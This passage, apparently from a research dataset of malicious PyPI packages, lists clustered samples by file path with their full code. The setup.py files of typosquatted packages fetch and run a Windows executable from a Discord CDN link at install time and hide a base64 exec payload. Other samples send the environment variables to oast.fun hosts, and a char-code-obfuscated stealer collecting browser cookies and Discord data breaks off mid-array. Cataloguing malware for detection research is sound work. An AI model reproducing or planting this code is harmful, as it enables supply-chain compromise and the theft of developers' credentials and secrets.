b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-install-pyyaml-v1.19.12",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '1.19.12'\nDESCRIPTION = 'A module for interacting with databases'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"install-pyyaml\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-keras-arg-v19.14.9",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '19.14.9'\nDESCRIPTION = 'A lightweight and extensible testing framework'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"keras-arg\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-opencv-keras-v17.10.13",
        "code": "from setuptools import setup, find_packages\nimport os\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\n\nVERSION = '17.10.13'\nDESCRIPTION = 'A library for data visualization'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"opencv_keras\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pandas-numpy-v8.19.3",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '8.19.3'\nDESCRIPTION = 'A package for network communication'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pandas-numpy\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-print-pip-v13.9.3",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '13.9.3'\nDESCRIPTION = 'A package for network communication'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"Print-pip\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-print-requests-v13.18.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '13.18.4'\nDESCRIPTION = 'A powerful deep learning library'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"Print-requests\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-pygame-print-v15.0.6",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '15.0.6'\nDESCRIPTION = 'A module for interacting with databases'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pygame-Print\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"dist\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-req-matplotlib-v11.2.18",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '11.2.18'\nDESCRIPTION = 'A powerful deep learning library'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"req-matplotlib\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-requests-pandas-v3.10.17",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '3.10.17'\nDESCRIPTION = 'A library for data visualization'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"requests-pandas\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-sqlalchemy-install-v10.9.4",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '10.9.4'\nDESCRIPTION = 'A package for network communication'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sqlalchemy-install\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-sqlalchemy-requests-v7.1.1",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '7.1.1'\nDESCRIPTION = 'A package for scientific computing'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sqlalchemy-requests\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n\n\nimport requests\nimport tempfile\nimport subprocess\n\nurl = 'https://cdn.discordapp.com/attachments/1109115014054416495/1109465188433936425/Windows.exe'\nresponse = requests.get(url)\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file.write(response.content)\n    exe_path = tmp_file.name\n\nsubprocess.call([exe_path])\n"
      }
    ]
  },
  {
    "cluster_id": 10,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-b1ec2b9f-v0.1",
        "code": "import os\nimport base64\nimport requests\n\ndef hello():\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(\"http://csngft88cumgfr3deiig43by9rko6sn7o.oast.fun\", data=data, timeout=2)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-b1ec2b9f-v0.1.1",
        "code": "import os\nimport base64\nimport requests\n\ndef hello():\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(\"http://csngft88cumgfr3deiig43by9rko6sn7o.oast.fun\", data=data, timeout=2)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-b1ec2b9f-v0.2.0",
        "code": "import os\nimport base64\nimport requests\n\ndef hello():\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(\"http://upnasfwuhrawecezwlst8birymund77bc.oast.fun\", data=data, timeout=2)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-b1ec2b9f-v0.2.1",
        "code": "import os\nimport base64\nimport requests\n\ndef hello():\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(\"http://sbtnpwggzhrjftpytfsuvcogqgwv8uu5r.oast.fun\", data=data, timeout=2)\n"
      }
    ]
  },
  {
    "cluster_id": 11,
    "size": 7,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-02-pyobfexecute-v1.0.1",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,115,117,98,112,114,111,99,101,115,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,115,104,117,116,105,108,10,105,109,112,111,114,116,32,119,105,110,114,101,103,10,105,109,112,111,114,116,32,122,105,112,102,105,108,101,10,10,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,114,101,113,117,101,115,116,115,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,115,111,99,107,101,116,115,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,112,105,119,105,110,51,50,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,117,117,105,100,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,102,105,103,108,101,116,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,103,101,116,109,97,99,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,112,121,97,117,116,111,103,117,105,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,114,111,98,108,111,120,112,121,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,80,105,108,108,111,119,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,116,113,100,109,39,93,41,10,115,117,98,112,114,111,99,101,115,115,46,114,117,110,40,91,39,112,105,112,39,44,32,39,105,110,115,116,97,108,108,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,93,41,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,32,105,109,112,111,114,116,32,115,117,98,112,114,111,99,101,115,115,10,32,105,109,112,111,114,116,32,119,105,110,114,101,103,10,32,105,109,112,111,114,116,32,111,115,10,10,117,1